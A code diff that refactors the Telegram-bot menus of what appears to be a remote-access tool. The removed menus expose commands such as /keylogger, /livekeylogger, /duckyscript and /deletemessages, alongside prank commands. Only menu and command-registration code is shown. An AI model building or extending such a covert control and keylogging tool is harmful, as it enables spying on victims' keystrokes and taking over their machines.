-        self.mainmenu_ref = self.new_menu(buttons, label="🎮 Input / Device Control", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
-        return self.mainmenu_ref
+        return self.generate_category_menu("🎮 Input", "🎮 Input / Device Control")
 
     def menu_messaging(self):
-        buttons = {
-            "🔙 Back": "/mainmenu",
-            "📤 Bsend": "/bsend",
-            "🆔 Id": "/id",
-            "❌ Deletemessages": "/deletemessages",
-            "🗑️ Deleteallmessages": "/deleteallmessages",
-        }
-
-        if self.mainmenu_ref:
-            self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="📋 Messaging", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
-        return self.mainmenu_ref
+        return self.generate_category_menu("📋 Messaging", "📋 Messaging")
 
     def menu_cantopen(self):
-        buttons = {
-            "🔙 Back": "/mainmenu",
-            "🚫 Cantopenadd": "/cantopenadd",
-            "❌ Cantopenremove": "/cantopenremove",
-            "📋 Cantopenmenu": "/cantopenmenu",
-        }
-
-        if self.mainmenu_ref:
-            self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🔒 Can't Open List", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
-        return self.mainmenu_ref
+        return self.generate_category_menu("🔒 Can't Open", "🔒 Can't Open List")
 
     def menu_keylogger(self):
-        buttons = {
-            "🔙 Back": "/mainmenu",
-            "⌨️ Keylogger": "/keylogger",
-            "📡 Livekeylogger": "/livekeylogger",
-        }
-
-        if self.mainmenu_ref:
-            self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🧠 Keylogger", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
-        return self.mainmenu_ref
+        return self.generate_category_menu("🧠 Keylogger", "🧠 Keylogger")
 
     def menu_misc(self):
-        buttons = {
-            "🔙 Back": "/mainmenu",
-            "🦑 Plankton": "/plankton",
-            "🔇 Planktonnoaudio": "/planktonnoaudio",
-            "🐷 Johnpork": "/johnpork",
-            "🔕 Johnporknoaudio": "/johnporknoaudio",
-            "🛋️ Gabinetti": "/gabinetti",
-            "⌨️ Duckyscript": "/duckyscript",
-            "❓ Duckyhelp": "/duckyhelp",
-            "🌐 Browser": "/browser",
-        }
+        return self.generate_category_menu("🦑 Misc", "🦑 Misc")
 
-        if self.mainmenu_ref:
-            self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🦑 Misc", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
-        return self.mainmenu_ref
+    def menu_plugins(self):
+        return self.generate_category_menu("🔌 PlugIns", "🔌 Your Plugins")
+
 
     def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
         editable = EditableMessage(self.bot, self.owner_id, content, autosend)
@@ -1774,7 +1651,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.__play_loaded_sound("fart")
 
     def replyquickmenu(self) -> int:
-        commands = list(map(lambda x: f"/{x['command']}", self.commands))
+        commands = [f"/{c.name}" for c in self.commands]
         keyboard = [commands[i:i + 2] for i in range(0, len(commands), 2)]        
         return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)
 
@@ -2330,9 +2207,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         ...
 
     def update_commands(self) -> bool:
-        self.commands = self.extract_commands()
+        commands = self.extract_commands()
         url = f'https://api.telegram.org/bot{self.token}/setMyCommands'
-        payload = {'commands': self.commands}
+        payload = {'commands': commands}
         response = requests.post(url, json=payload)
         return response.status_code == 200
 
